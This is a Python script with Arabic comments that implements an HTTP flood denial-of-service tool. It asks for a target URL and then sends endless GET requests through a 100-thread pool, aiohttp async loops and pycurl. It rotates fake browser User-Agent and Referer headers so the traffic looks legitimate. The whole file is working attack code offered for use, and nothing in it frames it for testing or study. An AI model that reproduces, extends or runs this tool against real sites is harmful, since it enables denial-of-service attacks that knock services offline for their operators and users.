import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import random

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = False

# قائمة برؤوس HTTP مختلفة
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]

def get_random_headers():
    """إرجاع رؤوس HTTP عشوائية."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

def send_requests_threaded(target):
    session = requests.Session()
    
    def send_request():
        while not stop_attack_flag:
            try:
                headers = get_random_headers()
                session.get(target, headers=headers, timeout=5)
            except requests.exceptions.RequestException:
                pass

    num_threads = 100  # عدد الخيوط يمكن تعديله حسب قدرة الخادم

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]
        
        for future in futures:
            if stop_attack_flag:
                break

async def send_requests_aiohttp(target):
    async with aiohttp.ClientSession() as session:
        while not stop_attack_flag:
            try:
                headers = get_random_headers()
                async with session.get(target, headers=headers, timeout=5) as response:
                    await response.text()
            except aiohttp.ClientError:
                pass

def send_requests_pycurl(target):
    while not stop_attack_flag:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        headers = get_random_headers()
        c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def start_attack():
    global stop_attack_flag
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except Exception as e:
        print(f"Error: {str(e)}")

def execute_attack(target):
    global stop_attack_flag

    print(f"Starting continuous attack on {target}...")

    try:
        # استخدام ThreadPoolExecutor للخيوط
        with ThreadPoolExecutor() as executor:
            executor.submit(send_requests_threaded, target)

        # استخدام asyncio للبرمجة غير المتزامنة
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_requests_aiohttp(target))

        # استخدام pycurl
        send_requests_pycurl(target)

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

    except KeyboardInterrupt:
        stop_attack_flag = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except Exception as e:
        print(f"Error during attack: {str(e)}")

def main():
    try:
        start_attack()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
